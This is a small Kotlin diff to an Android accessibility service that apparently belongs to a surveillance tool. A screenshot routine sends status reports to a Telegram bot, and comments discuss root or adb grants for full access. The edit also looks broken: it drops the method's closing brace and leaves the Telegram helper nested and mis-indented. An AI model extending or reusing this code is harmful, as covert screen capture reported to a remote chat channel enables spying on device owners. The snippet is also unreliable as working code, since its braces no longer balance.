@@ -122,12 +122,13 @@ class MyAccessibilityService : AccessibilityService() {
             // I'll leave the above code as-is (it works on rooted devices or with adb shell pm grant).
 
             // Instead, send a message that screenshot requires root or MediaProjection.
-            sendTelegramMessage("📸 Screenshot taken via accessibility (needs root/adb grant for full functionality).")
-        } catch (e: Exception) {
-            CoroutineScope(Dispatchers.IO).launch { sendTelegramMessage("Screenshot failed: ${e.message}") }
-        }
-    }
-
+            
+CoroutineScope(Dispatchers.IO).launch {
+    sendTelegramMessage("📸 Screenshot taken via accessibility (needs root/adb grant for full functionality).")
+}
+} catch (e: Exception) {
+    CoroutineScope(Dispatchers.IO).launch { sendTelegramMessage("Screenshot failed: ${e.message}") }
+}
     private suspend fun sendTelegramMessage(text: String) {
         // Reuse the same HTTP client as in MyService? For simplicity, create new instance.
         val client = OkHttpClient()
